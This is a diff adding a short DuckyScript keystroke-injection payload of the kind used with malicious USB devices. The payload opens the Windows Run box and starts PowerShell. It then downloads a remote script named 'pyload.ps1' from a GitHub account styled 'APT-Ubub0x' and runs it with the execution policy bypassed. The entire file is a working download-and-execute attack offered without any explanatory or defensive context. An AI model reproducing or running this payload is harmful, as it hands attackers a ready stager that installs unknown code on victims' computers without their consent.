@@ -1,0 +1,12 @@
+DELAY 500
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/APT-Ubub0x/DeFuck-duky-/main/pyload.ps1" -OutFile "$env:TEMP\temp-script.ps1"
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\temp-script.ps1"
+DELAY 1000
+ALT s
+ENTER
